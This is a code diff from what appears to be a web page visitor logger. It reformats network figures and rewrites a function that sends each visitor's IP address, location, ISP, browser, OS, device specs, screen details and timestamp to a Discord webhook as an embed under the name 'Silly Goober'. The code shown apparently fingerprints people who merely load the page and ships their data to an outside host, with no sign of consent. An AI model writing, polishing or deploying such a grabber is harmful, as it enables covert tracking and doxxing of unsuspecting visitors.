@@ -79,9 +79,9 @@
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (connection) {
                 return {
-                    downlink: connection.downlink ? connection.downlink + "Mbps" : "Unknown",
+                    downlink: connection.downlink ? connection.downlink + " Mbps" : "Unknown",
                     effectiveType: connection.effectiveType || "Unknown",
-                    rtt: connection.rtt ? connection.rtt + "ms" : "Unknown",
+                    rtt: connection.rtt ? connection.rtt + " ms" : "Unknown",
                 };
             }
             return { downlink: "Unknown", effectiveType: "Unknown", rtt: "Unknown" };
@@ -109,20 +109,26 @@
             };
         }
 
-        // Function to send data to the Discord webhook
+        // Function to send data to the Discord webhook using an embed
         function sendToDiscord(data) {
             const payload = JSON.stringify({
-                content: `**New Visitor Logged**\n` +
-                         `**IP:** ${data.ip}\n` +
-                         `**Location:** ${data.city}, ${data.region}, ${data.country}\n` +
-                         `**Organization:** ${data.org}\n` +
-                         `**Browser:** ${data.browser}\n` +
-                         `**Operating System:** ${data.os}\n` +
-                         `**Network:** Downlink: ${data.network.downlink}, RTT: ${data.network.rtt}, Effective Type: ${data.network.effectiveType}\n` +
-                         `**Device Info:** CPU Cores: ${data.device.hardwareConcurrency}, Memory: ${data.device.deviceMemory}GB, Language: ${data.device.language}, Platform: ${data.device.platform}, Cookie Enabled: ${data.device.cookieEnabled}\n` +
-                         `**Screen Resolution:** ${data.screen.width}x${data.screen.height}, Color Depth: ${data.screen.colorDepth}, Pixel Depth: ${data.screen.pixelDepth}\n` +
-                         `**Timestamp:** ${data.timestamp}`,
-                username: 'Web Logger'
+                embeds: [{
+                    title: "New Visitor Logged",
+                    color: 16711808, // Pink color in decimal (Hex: #FF007F)
+                    fields: [
+                        { name: "IP", value: data.ip || "Unknown", inline: true },
+                        { name: "Location", value: `${data.city || "Unknown"}, ${data.region || "Unknown"}, ${data.country || "Unknown"}`, inline: true },
+                        { name: "Organization", value: data.org || "Unknown", inline: true },
+                        { name: "Browser", value: data.browser || "Unknown", inline: true },
+                        { name: "Operating System", value: data.os || "Unknown", inline: true },
+                        { name: "Network", value: `Downlink: ${data.network.downlink}, RTT: ${data.network.rtt}, Effective Type: ${data.network.effectiveType}`, inline: false },
+                        { name: "Device Info", value: `CPU Cores: ${data.device.hardwareConcurrency}, Memory: ${data.device.deviceMemory} GB, Language: ${data.device.language}, Platform: ${data.device.platform}, Cookie Enabled: ${data.device.cookieEnabled}`, inline: false },
+                        { name: "Screen Resolution", value: `${data.screen.width}x${data.screen.height}, Color Depth: ${data.screen.colorDepth}, Pixel Depth: ${data.screen.pixelDepth}`, inline: false },
+                        { name: "Timestamp", value: data.timestamp || "Unknown", inline: false },
+                    ],
+                }],
+                username: 'Silly Goober',
+                avatar_url: 'https://schizophrenic.lol/assets/schizologo.png',
             });
 
             // Attempt to send data using fetch first
